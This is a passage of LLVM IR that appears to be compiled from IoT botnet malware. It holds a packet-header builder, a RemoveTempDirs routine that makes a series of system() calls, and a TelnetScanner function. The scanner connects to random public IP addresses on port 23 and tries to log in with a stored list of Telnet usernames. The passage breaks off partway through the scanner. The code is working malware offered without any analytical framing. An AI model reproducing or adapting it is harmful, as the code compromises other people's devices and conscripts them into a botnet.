  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* noundef getelementptr inbounds ([43 x i8], [43 x i8]* @.str.474, i64 0, i64 0))
  %2 = call i32 @system(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.475, i64 0, i64 0))
  %3 = call i32 @system(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.476, i64 0, i64 0))
  %4 = call i32 @system(i8* noundef getelementptr inbounds ([20 x i8], [20 x i8]* @.str.477, i64 0, i64 0))
  %5 = call i32 @system(i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.478, i64 0, i64 0))
  %6 = call i32 @system(i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.479, i64 0, i64 0))
  %7 = call i32 @system(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.480, i64 0, i64 0))
  %8 = call i32 @system(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.481, i64 0, i64 0))
  %9 = call i32 @system(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str.482, i64 0, i64 0))
  %10 = call i32 @system(i8* noundef getelementptr inbounds ([37 x i8], [37 x i8]* @.str.483, i64 0, i64 0))
  %11 = call i32 @system(i8* noundef getelementptr inbounds ([23 x i8], [23 x i8]* @.str.484, i64 0, i64 0))
  %12 = call i32 @system(i8* noundef getelementptr inbounds ([23 x i8], [23 x i8]* @.str.485, i64 0, i64 0))
  %13 = call i32 @system(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str.486, i64 0, i64 0))
  ret void
}

declare i32 @system(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @TelnetScanner(i32 noundef %0, i32 noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i64, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca %struct.fd_set*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %26 = call i32 @getdtablesize() #10
  %27 = sub nsw i32 %26, 100
  store i32 %27, i32* %5, align 4
  %28 = load i32, i32* %5, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %31, label %33

31:                                               ; preds = %2
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  br label %33

33:                                               ; preds = %31, %2
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 noundef zeroext 23) #12
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %38, i8 0, i64 8, i1 false)
  %39 = call noalias i8* @malloc(i64 noundef 1025) #10
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %40, i8 0, i64 1025, i1 false)
  %41 = load i32, i32* %5, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  store i64 %42, i64* %20, align 8
  %45 = bitcast %struct.telstate_t* %44 to i8*
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %45, i8 0, i64 %48, i1 false)
  store i32 0, i32* %6, align 4
  br label %49

49:                                               ; preds = %67, %33
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %70

53:                                               ; preds = %49
  %54 = load i32, i32* %6, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %55
  %57 = bitcast %struct.telstate_t* %56 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %57, i8 0, i64 32, i1 false)
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = load i8*, i8** %17, align 8
  %63 = load i32, i32* %6, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 9
  store i8* %62, i8** %66, align 8
  br label %67

67:                                               ; preds = %53
  %68 = load i32, i32* %6, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %6, align 4
  br label %49, !llvm.loop !35

70:                                               ; preds = %49
  br label %71

71:                                               ; preds = %892, %70
  br label %72

72:                                               ; preds = %71
  store i32 0, i32* %6, align 4
  br label %73

73:                                               ; preds = %889, %72
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %5, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %892

77:                                               ; preds = %73
  %78 = load i32, i32* %6, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 7
  %82 = load i32, i32* %81, align 16
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %91

84:                                               ; preds = %77
  %85 = call i64 @time(i64* noundef null) #10
  %86 = trunc i64 %85 to i32
  %87 = load i32, i32* %6, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 7
  store i32 %86, i32* %90, align 16
  br label %91

91:                                               ; preds = %84, %77
  %92 = load i32, i32* %6, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 2
  %96 = load i8, i8* %95, align 8
  %97 = zext i8 %96 to i32
  switch i32 %97, label %888 [
    i32 0, label %98
    i32 1, label %234
    i32 2, label %343
    i32 3, label %395
    i32 4, label %440
    i32 5, label %492
    i32 6, label %537
    i32 7, label %637
    i32 8, label %719
  ]

98:                                               ; preds = %91
  %99 = load i32, i32* %6, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 3
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 1
  br i1 %105, label %106, label %126

106:                                              ; preds = %98
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 9
  %111 = load i8*, i8** %110, align 8
  store i8* %111, i8** %21, align 8
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %113
  %115 = bitcast %struct.telstate_t* %114 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %115, i8 0, i64 32, i1 false)
  %116 = load i8*, i8** %21, align 8
  %117 = load i32, i32* %6, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 9
  store i8* %116, i8** %120, align 8
  %121 = call i32 @getRandomPublicIP()
  %122 = load i32, i32* %6, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 1
  store i32 %121, i32* %125, align 4
  br label %174

126:                                              ; preds = %98
  %127 = load i32, i32* %6, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 3
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %173

134:                                              ; preds = %126
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 4
  %139 = load i8, i8* %138, align 2
  %140 = add i8 %139, 1
  store i8 %140, i8* %138, align 2
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 5
  %145 = load i8, i8* %144, align 1
  %146 = add i8 %145, 1
  store i8 %146, i8* %144, align 1
  %147 = load i32, i32* %6, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 5
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i64
  %153 = icmp eq i64 %152, 19
  br i1 %153, label %154, label %159

154:                                              ; preds = %134
  %155 = load i32, i32* %6, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 3
  store i8 1, i8* %158, align 1
  br label %889

159:                                              ; preds = %134
  %160 = load i32, i32* %6, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 4
  %164 = load i8, i8* %163, align 2
  %165 = zext i8 %164 to i64
  %166 = icmp eq i64 %165, 19
  br i1 %166, label %167, label %172

167:                                              ; preds = %159
  %168 = load i32, i32* %6, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 3
  store i8 1, i8* %171, align 1
  br label %889

172:                                              ; preds = %159
  br label %173

173:                                              ; preds = %172, %126
  br label %174

174:                                              ; preds = %173, %106
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %175, align 4
  %176 = call zeroext i16 @htons(i16 noundef zeroext 23) #12
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %176, i16* %177, align 2
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %179 = getelementptr inbounds [8 x i8], [8 x i8]* %178, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %179, i8 0, i64 8, i1 false)
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  store i32 %184, i32* %186, align 4
  %187 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #10
  %188 = load i32, i32* %6, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  store i32 %187, i32* %191, align 16
  %192 = load i32, i32* %6, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = icmp eq i32 %196, -1
  br i1 %197, label %198, label %199

198:                                              ; preds = %174
  br label %889

199:                                              ; preds = %174
  %200 = load i32, i32* %6, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = load i32, i32* %6, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 16
  %210 = call i32 (i32, i32, ...) @fcntl(i32 noundef %209, i32 noundef 3, i8* noundef null)
  %211 = or i32 %210, 2048
  %212 = call i32 (i32, i32, ...) @fcntl(i32 noundef %204, i32 noundef 4, i32 noundef %211)
  %213 = load i32, i32* %6, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %219 = call i32 @connect(i32 noundef %217, %struct.sockaddr* noundef %218, i32 noundef 16)
  %220 = icmp eq i32 %219, -1
  br i1 %220, label %221, label %229

221:                                              ; preds = %199
  %222 = call i32* @__errno_location() #12
  %223 = load i32, i32* %222, align 4
  %224 = icmp ne i32 %223, 115
  br i1 %224, label %225, label %229

225:                                              ; preds = %221
  %226 = load i32, i32* %6, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %227
  call void @reset_telstate(%struct.telstate_t* noundef %228)
  br label %233

229:                                              ; preds = %221, %199
  %230 = load i32, i32* %6, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %231
  call void @advance_telstate(%struct.telstate_t* noundef %232, i32 noundef 1)
  br label %233

233:                                              ; preds = %229, %225
  br label %888

234:                                              ; preds = %91
  br label %235

235:                                              ; preds = %234
  store %struct.fd_set* %12, %struct.fd_set** %23, align 8
  store i32 0, i32* %22, align 4
  br label %236

236:                                              ; preds = %246, %235
  %237 = load i32, i32* %22, align 4
  %238 = zext i32 %237 to i64
  %239 = icmp ult i64 %238, 16
  br i1 %239, label %240, label %249

240:                                              ; preds = %236
  %241 = load %struct.fd_set*, %struct.fd_set** %23, align 8
  %242 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %241, i32 0, i32 0
  %243 = load i32, i32* %22, align 4
  %244 = zext i32 %243 to i64
  %245 = getelementptr inbounds [16 x i64], [16 x i64]* %242, i64 0, i64 %244
  store i64 0, i64* %245, align 8
  br label %246

246:                                              ; preds = %240
  %247 = load i32, i32* %22, align 4
  %248 = add i32 %247, 1
  store i32 %248, i32* %22, align 4
  br label %236, !llvm.loop !36

249:                                              ; preds = %236
  br label %250

250:                                              ; preds = %249
  br label %251

251:                                              ; preds = %250
  %252 = load i32, i32* %6, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 16
  %257 = srem i32 %256, 64
  %258 = zext i32 %257 to i64
  %259 = shl i64 1, %258
  %260 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %261 = load i32, i32* %6, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %262
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 16
  %266 = sdiv i32 %265, 64
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 %267
  %269 = load i64, i64* %268, align 8
  %270 = or i64 %269, %259
  store i64 %270, i64* %268, align 8
  %271 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %271, align 8
  %272 = load i32, i32* %3, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %273, i64* %274, align 8
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = add nsw i32 %279, 1
  %281 = call i32 @select(i32 noundef %280, %struct.fd_set* noundef null, %struct.fd_set* noundef %12, %struct.fd_set* noundef null, %struct.timeval* noundef %13)
  store i32 %281, i32* %7, align 4
  %282 = load i32, i32* %7, align 4
  %283 = icmp eq i32 %282, 1
  br i1 %283, label %284, label %320

284:                                              ; preds = %251
  %285 = load i32, i32* %6, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %286
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %287, i32 0, i32 7
  store i32 0, i32* %288, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %289 = load i32, i32* %6, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = bitcast i32* %15 to i8*
  %295 = call i32 @getsockopt(i32 noundef %293, i32 noundef 1, i32 noundef 4, i8* noundef %294, i32* noundef %14) #10
  %296 = load i32, i32* %15, align 4
  %297 = icmp ne i32 %296, 0
  br i1 %297, label %298, label %302

298:                                              ; preds = %284
  %299 = load i32, i32* %6, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %300
  call void @reset_telstate(%struct.telstate_t* noundef %301)
  br label %319

302:                                              ; preds = %284
  %303 = load i32, i32* %6, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = load i32, i32* %6, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = call i32 (i32, i32, ...) @fcntl(i32 noundef %312, i32 noundef 3, i8* noundef null)
  %314 = and i32 %313, -2049
  %315 = call i32 (i32, i32, ...) @fcntl(i32 noundef %307, i32 noundef 4, i32 noundef %314)
  %316 = load i32, i32* %6, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %317
  call void @advance_telstate(%struct.telstate_t* noundef %318, i32 noundef 2)
  br label %319

319:                                              ; preds = %302, %298
  br label %889

320:                                              ; preds = %251
  %321 = load i32, i32* %7, align 4
  %322 = icmp eq i32 %321, -1
  br i1 %322, label %323, label %327

323:                                              ; preds = %320
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %325
  call void @reset_telstate(%struct.telstate_t* noundef %326)
  br label %889

327:                                              ; preds = %320
  br label %328

328:                                              ; preds = %327
  %329 = load i32, i32* %6, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 7
  %333 = load i32, i32* %332, align 16
  %334 = add i32 %333, 7
  %335 = zext i32 %334 to i64
  %336 = call i64 @time(i64* noundef null) #10
  %337 = icmp slt i64 %335, %336
  br i1 %337, label %338, label %342

338:                                              ; preds = %328
  %339 = load i32, i32* %6, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %340
  call void @reset_telstate(%struct.telstate_t* noundef %341)
  br label %342

342:                                              ; preds = %338, %328
  br label %888

343:                                              ; preds = %91
  %344 = load i32, i32* %6, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 16
  %349 = load i32, i32* %3, align 4
  %350 = load i32, i32* %6, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 9
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @read_until_response(i32 noundef %348, i32 noundef %349, i8* noundef %354, i32 noundef 1024, i8** noundef getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %356 = icmp ne i32 %355, 0
  br i1 %356, label %357, label %380

357:                                              ; preds = %343
  %358 = call i64 @time(i64* noundef null) #10
  %359 = trunc i64 %358 to i32
  %360 = load i32, i32* %6, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 7
  store i32 %359, i32* %363, align 16
  %364 = load i32, i32* %6, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 9
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @contains_fail(i8* noundef %368)
  %370 = icmp ne i32 %369, 0
  br i1 %370, label %371, label %375

371:                                              ; preds = %357
  %372 = load i32, i32* %6, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %373
  call void @advance_telstate(%struct.telstate_t* noundef %374, i32 noundef 0)
  br label %379

375:                                              ; preds = %357
  %376 = load i32, i32* %6, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %377
  call void @advance_telstate(%struct.telstate_t* noundef %378, i32 noundef 3)
  br label %379

379:                                              ; preds = %375, %371
  br label %889

380:                                              ; preds = %343
  %381 = load i32, i32* %6, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 7
  %385 = load i32, i32* %384, align 16
  %386 = add i32 %385, 7
  %387 = zext i32 %386 to i64
  %388 = call i64 @time(i64* noundef null) #10
  %389 = icmp slt i64 %387, %388
  br i1 %389, label %390, label %394

390:                                              ; preds = %380
  %391 = load i32, i32* %6, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %392
  call void @reset_telstate(%struct.telstate_t* noundef %393)
  br label %394

394:                                              ; preds = %390, %380
  br label %888

395:                                              ; preds = %91
  %396 = load i32, i32* %6, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 0
  %400 = load i32, i32* %399, align 16
  %401 = load i32, i32* %6, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 4
  %405 = load i8, i8* %404, align 2
  %406 = zext i8 %405 to i64
  %407 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %406
  %408 = load i8*, i8** %407, align 8
  %409 = load i32, i32* %6, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 4
  %413 = load i8, i8* %412, align 2
  %414 = zext i8 %413 to i64
  %415 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %414
  %416 = load i8*, i8** %415, align 8
  %417 = call i64 @strlen(i8* noundef %416) #11
  %418 = call i64 @send(i32 noundef %400, i8* noundef %408, i64 noundef %417, i32 noundef 16384)
  %419 = icmp slt i64 %418, 0
  br i1 %419, label %420, label %424

420:                                              ; preds = %395
  %421 = load i32, i32* %6, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %422
  call void @reset_telstate(%struct.telstate_t* noundef %423)
  br label %889

424:                                              ; preds = %395
  %425 = load i32, i32* %6, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %426
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %427, i32 0, i32 0
  %429 = load i32, i32* %428, align 16
